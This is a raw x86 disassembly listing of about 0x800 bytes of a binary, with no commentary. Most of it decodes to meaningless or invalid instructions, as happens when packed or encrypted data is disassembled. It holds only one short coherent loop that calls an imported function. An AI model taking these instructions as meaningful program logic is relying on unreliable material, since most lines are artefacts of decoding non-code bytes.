  41104b:	sbb    edi,DWORD PTR gs:[edx+0x54]
  41104f:	mov    BYTE PTR [esi],dh
  411051:	push   cs
  411052:	mov    ch,BYTE PTR [edi+0x1a]
  411055:	lds    esp,FWORD PTR [edx+0x27bead8e]
  41105b:	mov    esi,0xd7cbe0f3
  411060:	call   DWORD PTR [ebx+eiz*2+0x588e19f0]
  411067:	jae    0x411006
  411069:	loope  0x410ff3
  41106b:	xchg   ebp,eax
  41106c:	pop    ebx
  41106d:	xchg   edi,eax
  41106e:	shl    DWORD PTR [edi+eax*4+0xa],0x8
  411073:	in     eax,0xb5
  411075:	neg    DWORD PTR [ebp-0x2e]
  411078:	mov    al,ds:0xb5637065
  41107d:	jl     0x4110cf
  41107f:	sbb    al,0x41
  411081:	mov    ah,0xb2
  411083:	cmp    al,0x7d
  411085:	jb     0x411051
  411087:	mov    BYTE PTR ds:0x33973126,al
  41108d:	daa    
  41108e:	sbb    eax,0x6ddc2f0c
  411093:	jecxz  0x4110e4
  411095:	push   es
  411096:	push   ss
  411097:	mov    al,0x39
  411099:	xor    eax,0x79afc92a
  41109e:	outs   dx,DWORD PTR ds:[esi]
  41109f:	pop    ecx
  4110a0:	dec    ebp
  4110a1:	out    0x48,al
  4110a3:	mov    cl,0xdc
  4110a5:	cmp    BYTE PTR [edx],bh
  4110a7:	adc    DWORD PTR [ebp+0x67],ebx
  4110aa:	xchg   ecx,eax
  4110ab:	icebp  
  4110ac:	add    al,0x61
  4110ae:	out    0x5c,al
  4110b0:	or     DWORD PTR [esi-0x5e655999],ebx
  4110b6:	das    
  4110b7:	in     al,dx
  4110b8:	or     ebp,DWORD PTR [ebx]
  4110ba:	add    eax,0xaec3deb9
  4110bf:	mov    edx,0xa69af
  4110c4:	jmp    0x4110f7
  4110c6:	cmp    al,0x9f
  4110c8:	pusha  
  4110c9:	mov    ?,WORD PTR [ecx-0x1500e87e]
  4110cf:	idiv   DWORD PTR [esi]
  4110d1:	mov    bl,0x5e
  4110d3:	inc    eax
  4110d4:	pop    eax
  4110d5:	jnp    0x4110f9
  4110d7:	test   esi,ebx
  4110d9:	jmp    0x2fed16b7
  4110de:	jno    0x41113a
  4110e0:	(bad)  
  4110e1:	xlat   BYTE PTR ds:[ebx]
  4110e2:	jl     0x41110a
  4110e4:	cmp    cl,BYTE PTR [esi]
  4110e6:	xchg   ebp,eax
  4110e7:	ss out 0x80,al
  4110ea:	test   edi,ebp
  4110ec:	dec    esp
  4110ed:	sbb    al,0x62
  4110ef:	lds    ebx,FWORD PTR [edi]
  4110f1:	adc    edx,DWORD PTR [ebx]
  4110f3:	loopne 0x411131
  4110f5:	fsub   DWORD PTR [edx-0x1b797cf9]
  4110fb:	xchg   DWORD PTR [esi+0x39],edi
  4110fe:	nop
  4110ff:	fdivr  QWORD PTR [ecx+eax*8-0x13]
  411103:	push   edx
  411104:	scas   al,BYTE PTR es:[edi]
  411105:	and    al,bh
  411107:	mov    DWORD PTR [ecx-0x80],eax
  41110a:	adc    al,0x1f
  41110c:	mov    ebp,0xe19e8b40
  411111:	out    0x67,eax
  411113:	into   
  411114:	mov    ds:0x7681d7bd,al
  411119:	mov    eax,ds:0x2ea0869a
  41111e:	adc    al,0xa
  411120:	xlat   BYTE PTR ds:[ebx]
  411121:	jns    0x411156
  411123:	in     al,0x6e
  411125:	mov    dl,0xa5
  411127:	ds hlt 
  411129:	dec    esp
  41112a:	or     ebp,DWORD PTR [ecx+0x77]
  41112d:	inc    ebp
  41112e:	cld    
  41112f:	adc    dh,bh
  411131:	sbb    edx,ecx
  411133:	dec    esp
  411134:	js     0x411179
  411136:	or     cl,BYTE PTR [ecx]
  411138:	xor    dl,BYTE PTR ds:0x89e8bbea
  41113e:	jl     0x411110
  411140:	imul   eax,esp,0xedb268b0
  411146:	dec    edi
  411147:	mov    cs,WORD PTR [ebx]
  411149:	mov    al,0xd9
  41114b:	add    edx,DWORD PTR [ebx-0x20e79548]
  411151:	sub    eax,0x607a3343
  411156:	hlt    
  411157:	popf   
  411158:	ins    BYTE PTR es:[edi],dx
  411159:	dec    ecx
  41115a:	enter  0xdecd,0x94
  41115e:	sub    eax,0x71bb24a6
  411163:	or     esi,DWORD PTR [edi+0x1a]
  411166:	push   edx
  411167:	sub    eax,0x19949377
  41116c:	in     eax,dx
  41116d:	in     al,0x57
  41116f:	xor    edi,esp
  411171:	cmp    DWORD PTR [eax+0x51],ebx
  411174:	xor    BYTE PTR [edi-0x14],bl
  411177:	(bad)  
  411178:	fdivr  DWORD PTR [eax+esi*2+0x11]
  41117c:	sbb    DWORD PTR [esi-0x698009f3],esp
  411182:	cmp    BYTE PTR [esi+0xf9b7677],0x50
  411189:	adc    DWORD PTR [edi-0x417cdfda],ebp
  41118f:	sub    ah,bl
  411191:	inc    ebx
  411192:	pop    ecx
  411193:	int3   
  411194:	fs pop es
  411196:	lahf   
  411197:	pop    ds
  411198:	mov    edx,0xca1e3b85
  41119d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41119e:	popa   
  41119f:	add    eax,0x84db902f
  4111a4:	ror    BYTE PTR [ebx+0x1],1
  4111a7:	mov    cl,0x10
  4111a9:	in     al,0x66
  4111ab:	int3   
  4111ac:	dec    edx
  4111ad:	sar    ebx,1
  4111af:	fs cmp al,0x20
  4111b2:	push   ds
  4111b3:	(bad)  
  4111b4:	fsubr  st(4),st
  4111b6:	xchg   edx,eax
  4111b7:	mov    WORD PTR [esi],gs
  4111b9:	cmp    DWORD PTR [ebx],0xffffffd9
  4111bc:	loope  0x4111d7
  4111be:	clc    
  4111bf:	dec    esi
  4111c0:	shl    ebp,0x26
  4111c3:	mov    fs,ebp
  4111c5:	icebp  
  4111c6:	push   edi
  4111c7:	adc    al,0x9c
  4111c9:	in     eax,dx
  4111ca:	aaa    
  4111cb:	xor    eax,0x9ce4a10d
  4111d0:	inc    ecx
  4111d1:	stc    
  4111d2:	xor    al,0x66
  4111d4:	dec    ebx
  4111d5:	fistp  DWORD PTR [eax]
  4111d7:	ror    dl,cl
  4111d9:	sbb    al,0x6c
  4111db:	out    0x40,al
  4111dd:	aas    
  4111de:	je     0x411191
  4111e0:	in     al,0xad
  4111e2:	lods   al,BYTE PTR ds:[esi]
  4111e3:	sub    al,0xcd
  4111e5:	jne    0x411254
  4111e7:	retf   
  4111e8:	mov    ecx,0x57299dda
  4111ed:	xor    BYTE PTR [ebx],bl
  4111ef:	mov    ds:0xc6ccda28,eax
  4111f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f5:	aad    0x14
  4111f7:	daa    
  4111f8:	stos   DWORD PTR es:[edi],eax
  4111f9:	adc    al,0x64
  4111fb:	imul   ecx
  4111fd:	jno    0x41124c
  4111ff:	in     al,dx
  411200:	mov    ds:0xe04419d9,eax
  411205:	aad    0x6f
  411207:	sub    eax,0x5c96d47
  41120c:	mov    ?,edi
  41120e:	mov    eax,0x87407288
  411213:	adc    al,0x91
  411215:	ret    0xabf0
  411218:	cmc    
  411219:	cli    
  41121a:	loope  0x4111c1
  41121c:	or     bl,cl
  41121e:	pusha  
  41121f:	fwait
  411220:	xchg   ebp,eax
  411221:	lods   al,BYTE PTR ss:[esi]
  411223:	sub    eax,0xa7b3f325
  411228:	inc    ebp
  411229:	and    cl,BYTE PTR [ebx]
  41122b:	fdiv   st(5),st
  41122d:	xlat   BYTE PTR ds:[ebx]
  41122e:	sbb    esp,DWORD PTR [esi+ebp*4-0x78861e81]
  411235:	fldcw  WORD PTR ds:0xaf5250ea
  41123b:	lds    ebp,FWORD PTR [eax-0x286d95df]
  411241:	rcr    DWORD PTR [ebx-0x6c],1
  411244:	daa    
  411245:	and    al,0x94
  411247:	adc    BYTE PTR [edx],cl
  411249:	popw   ds
  41124b:	test   eax,0xfa6e2235
  411250:	pop    ss
  411251:	in     al,0x98
  411253:	pop    esi
  411254:	xor    BYTE PTR [ebx+edi*2],cl
  411257:	fadd   st(4),st
  411259:	fisub  DWORD PTR [edx]
  41125b:	retf   0x73dd
  41125e:	into   
  41125f:	xchg   ecx,eax
  411260:	jge    0x411298
  411262:	dec    esi
  411263:	out    dx,eax
  411264:	lahf   
  411265:	adc    BYTE PTR [esi-0x27],cl
  411268:	xor    eax,0xc1c8a302
  41126d:	or     eax,0x2a9209f1
  411272:	pop    esp
  411273:	inc    eax
  411274:	or     al,0xe0
  411276:	and    BYTE PTR [ebx+0x26],bh
  411279:	(bad)  
  41127a:	clc    
  41127b:	das    
  41127c:	push   0xffffffbc
  41127e:	mov    ebx,0x657c5ac9
  411283:	frstor [eax+0x79]
  411286:	push   esp
  411287:	shl    ebx,1
  411289:	pop    edi
  41128a:	add    BYTE PTR [edi-0x929d4f],al
  411290:	lods   al,BYTE PTR ds:[esi]
  411291:	popf   
  411292:	push   ss
  411293:	loope  0x4112f5
  411295:	adc    BYTE PTR [eax],bl
  411297:	inc    ebp
  411298:	or     DWORD PTR [ebx],ebp
  41129a:	pop    ebp
  41129b:	out    dx,al
  41129c:	mov    DWORD PTR [ecx+0x29ef727c],ebp
  4112a2:	push   cs
  4112a3:	in     eax,dx
  4112a4:	sbb    BYTE PTR [ebx+0x22eea09c],0xa5
  4112ab:	mov    dh,0x24
  4112ad:	iret   
  4112ae:	or     ebx,ebx
  4112b0:	(bad)  
  4112b1:	push   esp
  4112b2:	neg    BYTE PTR [ecx]
  4112b4:	repz cmp al,0x42
  4112b7:	stc    
  4112b8:	loopne 0x411242
  4112ba:	add    BYTE PTR [ecx-0x68],ah
  4112bd:	imul   esp,DWORD PTR [eax],0xffffffad
  4112c0:	aaa    
  4112c1:	push   eax
  4112c2:	inc    ecx
  4112c3:	add    BYTE PTR [eax-0xdaadd1a],bl
  4112c9:	popa   
  4112ca:	adc    ah,BYTE PTR [ebx+0x5]
  4112cd:	pop    esi
  4112ce:	xor    ch,BYTE PTR [edi-0x75]
  4112d1:	loope  0x41126e
  4112d3:	scas   al,BYTE PTR es:[edi]
  4112d4:	nop
  4112d5:	mov    bh,0x59
  4112d7:	xlat   BYTE PTR ds:[ebx]
  4112d8:	mov    BYTE PTR [edx+eax*1-0x6f],al
  4112dc:	push   ss
  4112dd:	retf   0x9625
  4112e0:	stos   DWORD PTR es:[edi],eax
  4112e1:	popf   
  4112e2:	push   edi
  4112e3:	inc    eax
  4112e4:	xchg   ah,al
  4112e6:	push   ebx
  4112e7:	gs xor eax,0x3768d08d
  4112ed:	test   DWORD PTR [edi+ebp*4],ebx
  4112f0:	mov    al,ds:0x8d1c2e4b
  4112f5:	popa   
  4112f6:	mov    al,0x2f
  4112f8:	cmp    bh,BYTE PTR [ecx-0x72]
  4112fb:	(bad)  [esi+0x6f328e4c]
  411301:	lea    eax,[edi-0x1d63411f]
  411307:	inc    esp
  411308:	enter  0xed96,0xdf
  41130c:	xchg   ebx,eax
  41130d:	bound  esp,QWORD PTR [edx]
  41130f:	test   BYTE PTR [ecx-0x3f20ef02],ch
  411315:	lahf   
  411316:	sar    BYTE PTR [esi],cl
  411318:	bound  ebp,QWORD PTR [edx]
  41131a:	js     0x41132d
  41131c:	mov    eax,0x4057185b
  411321:	imul   esp,DWORD PTR [esi+0x72e5bf85],0xffffffc7
  411328:	cmp    ebx,DWORD PTR [esi-0x59]
  41132b:	retf   0x14d7
  41132e:	daa    
  41132f:	push   0xffffffc3
  411331:	fcom   QWORD PTR [edx]
  411333:	sub    bh,BYTE PTR [esi-0x1be0124a]
  411339:	jns    0x411350
  41133b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41133c:	pop    esi
  41133d:	jmp    0x6515:0x9aced614
  411344:	push   0x5b1614ba
  411349:	test   BYTE PTR [ecx+0x3],ch
  41134c:	push   0xfffffff7
  41134e:	(bad)  [ebx+edx*4-0x7728fed]
  411355:	fistp  DWORD PTR [esi]
  411357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411358:	pop    ds
  411359:	sub    dh,dl
  41135b:	jae    0x411320
  41135d:	mov    edi,0x96815c4d
  411362:	retf   
  411363:	lds    esi,FWORD PTR [ecx]
  411365:	push   cs
  411366:	mov    ecx,0xaf6b81b9
  41136b:	in     eax,dx
  41136c:	adc    BYTE PTR [esi-0x37e7740b],ch
  411372:	clc    
  411373:	mov    BYTE PTR [edi],dh
  411375:	mov    ebx,0xb418d832
  41137a:	cmp    DWORD PTR [eax+0x5a3378ed],edx
  411380:	jge    0x4113fe
  411382:	add    eax,0x27672de8
  411387:	leave  
  411388:	fld    QWORD PTR [ebx+0x2f]
  41138b:	imul   ebx,DWORD PTR [si-0x4a],0x86552397
  411393:	inc    edx
  411394:	cmp    bl,ah
  411396:	xor    al,0x5b
  411398:	repnz cmp ebp,DWORD PTR [ebx+0x4b]
  41139c:	ja     0x41132f
  41139e:	inc    edx
  41139f:	repnz sbb ebp,DWORD PTR [edx-0xb]
  4113a3:	nop
  4113a4:	and    al,0x30
  4113a6:	test   BYTE PTR [edx],cl
  4113a8:	and    esi,eax
  4113aa:	out    0x76,al
  4113ac:	stos   DWORD PTR es:[edi],eax
  4113ad:	ins    BYTE PTR es:[edi],dx
  4113ae:	ins    BYTE PTR es:[edi],dx
  4113af:	or     BYTE PTR [edx],bl
  4113b1:	mov    esi,0x596499d7
  4113b6:	sbb    BYTE PTR [ecx+0x3e],bl
  4113b9:	imul   ecx,edx,0xffffffb4
  4113bc:	call   0xb576:0x2708a6be
  4113c3:	cmp    al,0x3b
  4113c5:	mov    bh,0x5
  4113c8:	jno    0x4113c6
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fcfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fcfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fcfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fcfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e167
  411404:	push   0x42e1ed
  411409:	call   DWORD PTR ds:0x42e4e7
  41140f:	cmp    DWORD PTR ds:0x42fcfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fcfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fcfa,esi
  411429:	cmp    DWORD PTR ds:0x42fcfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	or     bl,dh
  411449:	add    DWORD PTR [eax+0x70704a0e],esp
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411458
  411454:	scas   eax,DWORD PTR es:[edi]
  411455:	retf   0xc8f2
  411458:	leave  
  411459:	jge    0x411498
  41145b:	or     al,0x13
  41145d:	sti    
  41145e:	mov    DWORD PTR [esi+ebx*4-0x78b89656],ecx
  411465:	cmp    DWORD PTR [ebx],ecx
  411467:	inc    ebx
  411468:	clc    
  411469:	aas    
  41146a:	mov    BYTE PTR [ebx],bh
  41146c:	cmp    ecx,DWORD PTR [ecx+esi*2+0x44fac14b]
  411473:	std    
  411474:	inc    esp
  411475:	mov    ds:0x8759e5f3,al
  41147a:	fadd   QWORD PTR [edx-0x15688d35]
  411480:	cmc    
  411481:	shr    BYTE PTR [ebx],cl
  411483:	fimul  DWORD PTR [edi+0x5bfa392c]
  411489:	add    ecx,DWORD PTR [ebp+0x19]
  41148c:	sbb    al,0x21
  41148e:	pop    eax
  41148f:	lds    edx,FWORD PTR [eax+0x71]
  411492:	xchg   esp,eax
  411493:	inc    eax
  411494:	dec    ebp
  411495:	xlat   BYTE PTR ds:[ebx]
  411496:	jecxz  0x4114b5
  411498:	stos   DWORD PTR es:[edi],eax
  411499:	fsubr  QWORD PTR [esi+ebp*8]
  41149c:	mov    eax,ds:0x56b1a36
  4114a1:	repnz retf 
  4114a3:	add    al,0x65
  4114a5:	push   esi
  4114a6:	lahf   
  4114a7:	inc    ecx
  4114a8:	adc    bh,BYTE PTR [edx+0x4c49661c]
  4114ae:	xlat   BYTE PTR ds:[ebx]
  4114af:	xor    ebp,ebp
  4114b1:	rol    BYTE PTR [ebp+0x46],cl
  4114b4:	mov    ch,ah
  4114b6:	outs   dx,DWORD PTR ds:[esi]
  4114b7:	xor    al,0xdc
  4114b9:	repnz loop 0x41145c
  4114bc:	sbb    ah,ah
  4114be:	or     al,0xc6
  4114c0:	ss inc edi
  4114c2:	cmc    
  4114c3:	in     al,0xb0
  4114c5:	dec    edi
  4114c6:	in     al,dx
  4114c7:	daa    
  4114c8:	push   edi
  4114c9:	test   eax,0xf46a1ce3
  4114ce:	add    ebx,DWORD PTR [ecx-0x32f3def1]
  4114d4:	adc    ah,dl
  4114d6:	sub    ah,dl
  4114d8:	xchg   ecx,eax
  4114d9:	adc    al,0x8
  4114db:	sbb    al,0x1d
  4114dd:	clc    
  4114de:	sub    DWORD PTR [ecx+0x69],ebx
  4114e1:	clc    
  4114e2:	cmp    ebx,DWORD PTR [edx]
  4114e4:	pop    ebx
  4114e5:	nop
  4114e6:	js     0x4114b0
  4114e8:	pop    esi
  4114e9:	and    eax,0x31e7f997
  4114ee:	ret    
  4114ef:	sar    bh,0x58
  4114f2:	fimul  DWORD PTR [edi]
  4114f4:	xor    eax,0x3a9d2e68
  4114f9:	or     ch,0x93
  4114fc:	outs   dx,DWORD PTR ds:[esi]
  4114fd:	push   edx
  4114fe:	nop
  4114ff:	add    al,BYTE PTR [ebp+0x52]
  411502:	add    BYTE PTR [eax],bl
  411504:	int    0x4f
  411506:	sbb    bl,ch
  411508:	cmp    ch,BYTE PTR [ecx-0xe]
  41150b:	push   edi
  41150c:	push   0x4f
  41150e:	jl     0x41152c
  411510:	push   es
  411511:	cwde   
  411512:	(bad)  
  411513:	into   
  411514:	adc    esi,ebp
  411516:	iret   
  411517:	scas   eax,DWORD PTR es:[edi]
  411518:	push   ss
  411519:	lods   eax,DWORD PTR ds:[esi]
  41151a:	lds    ebp,FWORD PTR [ebp-0x14]
  41151d:	dec    ebp
  41151e:	pop    ecx
  41151f:	sub    dh,dh
  411521:	mov    ds:0x31d63862,eax
  411526:	je     0x411528
  411528:	(bad)  
  411529:	enter  0xb87e,0xbd
  41152d:	fldcw  WORD PTR [ecx-0x26dbabc4]
  411533:	xor    DWORD PTR es:[edx],ebx
  411536:	xor    BYTE PTR [edi+0x52498828],0xd4
  41153d:	adc    BYTE PTR [edx-0x10],0xe3
  411541:	fld    TBYTE PTR [ebx+0x28dedd50]
  411547:	xor    eax,0x7a26671d
  41154c:	cmp    dh,cl
  41154e:	fldenv [ecx-0x51e9db4f]
  411554:	outs   dx,DWORD PTR ds:[esi]
  411555:	inc    ecx
  411556:	aam    0x3
  411558:	cmp    DWORD PTR [ebx-0x6b],ebx
  41155b:	or     DWORD PTR [eax],ebx
  41155d:	ds dec eax
  41155f:	jg     0x411576
  411561:	test   al,0xc5
  411563:	sahf   
  411564:	(bad)  
  411565:	or     al,0xf6
  411567:	or     eax,0x8a583f59
  41156c:	pop    es
  41156d:	(bad)
  411570:	xor    eax,edx
  411572:	xor    ebx,ecx
  411574:	xchg   edi,eax
  411575:	adc    eax,0xebd320c6
  41157a:	mov    ?,WORD PTR [edi+edi*4+0x34dfa05b]
  411581:	push   0x9aa93817
  411586:	daa    
  411587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411588:	jge    0x4115e3
  41158a:	aas    
  41158b:	pushf  
  41158c:	or     DWORD PTR [edi+0x1faf5aa7],ecx
  411592:	mov    ebx,eax
  411594:	ret    0x535a
  411597:	data16 mov cl,0x5
  41159a:	sub    dh,0x8a
  41159d:	push   ds
  41159e:	inc    edx
  41159f:	(bad)  
  4115a0:	xor    DWORD PTR [eax],eax
  4115a2:	inc    ebp
  4115a3:	adc    BYTE PTR [edi-0x3b],ch
  4115a6:	scas   eax,DWORD PTR es:[edi]
  4115a7:	std    
  4115a8:	popf   
  4115a9:	add    DWORD PTR [esi-0x5c18cd3d],0x4b65a54f
  4115b3:	push   ebp
  4115b4:	push   es
  4115b5:	pop    ss
  4115b6:	repz pop ebx
  4115b8:	dec    edi
  4115b9:	xor    BYTE PTR [edi+0x5],0xf
  4115bd:	retf   0xca40
  4115c0:	out    dx,al
  4115c1:	xchg   esi,eax
  4115c2:	jmp    0xa1f3:0xb4f5f15e
  4115c9:	and    BYTE PTR [ecx-0x73b82b9b],al
  4115cf:	xor    ebx,esi
  4115d1:	inc    ebx
  4115d2:	jle    0x411574
  4115d4:	push   ecx
  4115d5:	mov    al,0xb0
  4115d7:	mov    ah,0x5b
  4115d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115da:	ins    BYTE PTR es:[edi],dx
  4115db:	push   edi
  4115dc:	pop    ss
  4115dd:	mov    bl,0x7b
  4115df:	dec    ebp
  4115e0:	push   ebp
  4115e1:	pop    ecx
  4115e2:	add    eax,ebp
  4115e4:	cmp    BYTE PTR [ebx+0x6f],dh
  4115e7:	or     esp,ebp
  4115e9:	pop    ecx
  4115ea:	jmp    0xbf60ab87
  4115ef:	lds    esp,FWORD PTR [ebp+0x77e4065f]
  4115f5:	loop   0x41157a
  4115f7:	adc    edi,esp
  4115f9:	aam    0xa
  4115fb:	mov    ds:0x483b69c9,al
  411600:	mov    edx,0x84d5493c
  411605:	cli    
  411606:	outs   dx,BYTE PTR ds:[esi]
  411607:	pop    esi
  411608:	sbb    eax,0x5220189d
  41160d:	inc    edi
  41160e:	cwde   
  41160f:	lock je 0x4115ce
  411612:	stc    
  411613:	pop    esp
  411614:	shr    ah,1
  411616:	test   BYTE PTR [ebx-0x11],bl
  411619:	in     eax,dx
  41161a:	push   eax
  41161b:	call   0xbc6f27e1
  411620:	or     al,0x2
  411622:	adc    al,ch
  411624:	push   edi
  411625:	aad    0x3a
  411627:	pop    ss
  411628:	out    dx,al
  411629:	and    eax,0x5f8f3a56
  41162e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41162f:	sti    
  411630:	push   0x2c
  411632:	pop    edx
  411633:	pop    eax
  411634:	mov    DWORD PTR [edx+esi*8+0x2c981315],esi
  41163b:	test   al,0x3b
  41163d:	ins    BYTE PTR es:[edi],dx
  41163e:	fnstcw WORD PTR [esi-0x20038d8e]
  411644:	inc    edx
  411645:	cmp    ah,BYTE PTR [edi+0x2591ec0]
  41164b:	(bad)  [edx+ecx*8-0x7d6d1acf]
  411652:	test   eax,0x71c8b262
  411657:	cs pop ebx
  411659:	bound  esp,QWORD PTR [ebx-0x21c1782a]
  41165f:	mov    ecx,0xa88c3abb
  411664:	dec    edi
  411665:	xchg   edx,eax
  411666:	fs mov esp,0xa991582a
  41166c:	stc    
  41166d:	jle    0x411658
  41166f:	cld    
  411670:	dec    esp
  411671:	into   
  411672:	xlat   BYTE PTR ds:[ebx]
  411673:	xchg   ebp,eax
  411674:	mov    bh,0xd0
  411676:	cmp    DWORD PTR [ecx+0x1542a718],ebx
  41167c:	inc    ebx
  41167d:	ret    
  41167e:	(bad)  
  41167f:	test   DWORD PTR [edi+ebp*1],0x66fdee47
  411686:	pop    ebx
  411687:	ret    0x59e5
  41168a:	imul   ecx,DWORD PTR [edx],0x4b4294e6
  411690:	cld    
  411691:	(bad)  
  411692:	cli    
  411693:	mov    bl,0x79
  411695:	and    bh,cl
  411697:	ss xor al,0x9c
  41169a:	mov    ah,0xea
  41169c:	xchg   edx,eax
  41169d:	retf   0x784a
  4116a0:	mov    edi,0x89db3b95
  4116a5:	stos   BYTE PTR es:[edi],al
  4116a6:	sar    eax,1
  4116a8:	inc    ebx
  4116a9:	hlt    
  4116aa:	xchg   ecx,eax
  4116ab:	sbb    DWORD PTR [ecx+ebp*1],ebx
  4116ae:	retf   0x81ae
  4116b1:	push   0x8578ae5d
  4116b6:	in     al,dx
  4116b7:	dec    edx
  4116b8:	push   eax
  4116b9:	adc    DWORD PTR [ebx-0x3901fb1c],edi
  4116bf:	fdiv   QWORD PTR [eax]
  4116c1:	fld    QWORD PTR [edi]
  4116c3:	test   BYTE PTR [ebx],ch
  4116c5:	jp     0x411731
  4116c7:	je     0x4116c7
  4116c9:	aad    0x43
  4116cb:	mov    esp,0x416a1bf5
  4116d0:	or     ah,BYTE PTR [eax+0x62505f99]
  4116d6:	or     esp,DWORD PTR [edx-0x2286b0dc]
  4116dc:	iret   
  4116dd:	jecxz  0x4116d4
  4116df:	pop    ebx
  4116e0:	scas   eax,DWORD PTR es:[edi]
  4116e1:	mov    ch,0x2e
  4116e3:	scas   eax,DWORD PTR es:[edi]
  4116e4:	push   esp
  4116e5:	adc    ecx,DWORD PTR ds:0x7f88a0a
  4116eb:	push   ebx
  4116ec:	pusha  
  4116ed:	and    eax,0xa6fa783e
  4116f2:	mov    cl,0xff
  4116f4:	ins    BYTE PTR es:[edi],dx
  4116f5:	rcl    BYTE PTR [eax-0x5a],0xc4
  4116f9:	inc    BYTE PTR [esi]
  4116fb:	shr    al,cl
  4116fd:	(bad)  
  4116fe:	sbb    esi,ecx
  411700:	sub    dl,bh
  411702:	inc    edi
  411703:	int3   
  411704:	add    cl,BYTE PTR fs:[eax-0x221ca5f9]
  41170b:	pop    edi
  41170c:	cli    
  41170d:	push   edx
  41170e:	stos   BYTE PTR es:[edi],al
  41170f:	(bad)  
  411710:	in     eax,dx
  411711:	adc    BYTE PTR [edx-0x6b],bl
  411714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411715:	sub    al,0x3
  411717:	ret    0xfde9
  41171a:	data16 daa 
  41171c:	mov    dl,0xe8
  41171e:	shr    DWORD PTR [esi+0x5c],1
  411721:	repz out dx,al
  411723:	iret   
  411724:	xor    eax,0xead4c751
  411729:	fnsave [eax+0x1524391d]
  41172f:	popf   
  411730:	push   eax
  411731:	mov    cl,0xbe
  411733:	mov    esi,0x58de90e8
  411738:	mov    edx,0xaba8c880
  41173d:	lods   al,BYTE PTR ds:[esi]
  41173e:	adc    al,BYTE PTR [edi+0x75]
  411741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411742:	add    DWORD PTR [ebx+0x361388f8],ebp
  411748:	dec    esi
  411749:	dec    eax
  41174a:	arpl   WORD PTR [ebp+0x4b],dx
  41174d:	xor    al,0xad
  41174f:	jg     0x4117c7
  411751:	inc    ecx
  411752:	pop    ss
  411753:	dec    esi
  411754:	inc    esp
  411755:	lods   al,BYTE PTR ds:[esi]
  411756:	loope  0x411797
  411758:	sbb    eax,esi
  41175a:	rol    al,0xa4
  41175d:	aas    
  41175e:	cmc    
  41175f:	or     BYTE PTR [esi-0x81e62df],ch
  411765:	jmp    0xb6ec:0x8d1d1487
  41176c:	xor    ecx,DWORD PTR [eax-0x16]
  41176f:	(bad)  
  411770:	ss aas 
  411772:	test   BYTE PTR [ecx],dl
  411774:	mov    dl,0x32
  411776:	jg     0x41175d
  411778:	pop    esp
  411779:	enter  0x444c,0xee
  41177d:	les    ebx,FWORD PTR [eax-0x2836f29a]
  411783:	les    esp,FWORD PTR [esi-0xb]
  411786:	aas    
  411787:	in     al,dx
  411788:	fisubr WORD PTR [edi-0x35c30793]
  41178e:	pop    edi
  41178f:	adc    edx,DWORD PTR ds:0xd8d79787
  411795:	pop    eax
  411796:	sahf   
  411797:	(bad)  
  411799:	xor    DWORD PTR [ebp-0x41],eax
  41179c:	mov    bl,0xce
  41179e:	ds stos DWORD PTR es:[edi],eax
  4117a0:	aad    0x1c
  4117a2:	mov    ax,ds:0x7fe92181
  4117a8:	xchg   edx,eax
  4117a9:	xchg   ebp,eax
  4117aa:	(bad)  
  4117ab:	pop    edx
  4117ac:	push   ss
  4117ad:	fucomi st,st(6)
  4117af:	xor    eax,0x284db6fc
  4117b4:	jae    0x411811
  4117b6:	test   DWORD PTR [edx-0x4c],esp
  4117b9:	inc    ebp
  4117ba:	mov    ch,0xe0
  4117bc:	dec    edx
  4117bd:	push   ds
  4117be:	xchg   edx,eax
  4117bf:	push   ecx
  4117c0:	jo     0x411754
  4117c2:	mov    esp,0x82584f4a
  4117c7:	xchg   edx,eax
  4117c8:	xchg   edi,eax
  4117c9:	jecxz  0x411804
  4117cb:	adc    dl,BYTE PTR [ebx+eiz*2]
  4117ce:	jmp    0x2b24:0x22546d02
  4117d5:	cwde   
  4117d6:	adc    BYTE PTR [esp+ebp*4-0x6b],ah
  4117da:	sub    ch,BYTE PTR [esi]
  4117dc:	push   edi
  4117dd:	pop    eax
  4117de:	sub    BYTE PTR [ebp+eiz*1+0x3d],ch
  4117e2:	inc    ebp
  4117e3:	mov    ds:0x6ccb857b,al
  4117e8:	sahf   
  4117e9:	dec    edi
  4117ea:	jb     0x4117e8
  4117ec:	cmp    BYTE PTR [ebp+eax*8+0x4c5e84c],dl
  4117f3:	shl    BYTE PTR [edx],1
  4117f5:	sub    BYTE PTR [esi-0xe],ah
  4117f8:	mov    ecx,0xce86a00a
  4117fd:	js     0x411868
  4117ff:	add    al,0x8f
  411801:	imul   edx,DWORD PTR [edi],0xa9b14068
  411807:	shl    dh,0xeb
  41180a:	pop    ss
  41180b:	pushf  
  41180c:	push   esp
  41180d:	add    al,0x19
  41180f:	push   ecx
  411810:	sub    DWORD PTR [edx],ebx
  411812:	sbb    eax,0x867f9f16
  411817:	call   0x975eb2d5
  41181c:	jmp    0x333a2e82
  411821:	pop    es
  411822:	scas   eax,DWORD PTR es:[edi]
  411823:	push   ebx
  411824:	xchg   BYTE PTR ds:0xd482f2a,al
  41182a:	mov    edi,edx
